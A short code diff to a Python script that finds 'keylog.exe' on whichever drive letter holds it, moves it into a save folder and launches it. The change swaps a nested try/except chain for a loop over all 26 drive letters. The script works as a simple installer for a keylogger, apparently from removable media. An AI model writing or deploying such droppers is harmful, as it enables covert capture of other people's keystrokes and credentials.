@@ -8,28 +8,13 @@ exe_path = ':/keylog/keylog.exe'
 
 os.makedirs(save_path)
 
-try:
-    shutil.move('D'+exe_path, save_path)
-except:
+for i in range(26):
     try:
-        shutil.move('E'+exe_path, save_path)
+        shutil.move(chr(i + 65) + exe_path, save_path)
+        break
     except:
-        try:
-            shutil.move('F'+exe_path, save_path)
-        except:
-            try:
-                shutil.move('G'+exe_path, save_path)
-            except:
-                try:
-                    shutil.move('H'+exe_path, save_path)
-                except:
-                    try:
-                        shutil.move('I'+exe_path, save_path)
-                    except:
-                        try:
-                            shutil.move('J'+exe_path, save_path)
-                        except:
-                            print('error')
+        continue
+
 
 new_exe_path = save_path+'keylog.exe'
 os.startfile(new_exe_path)
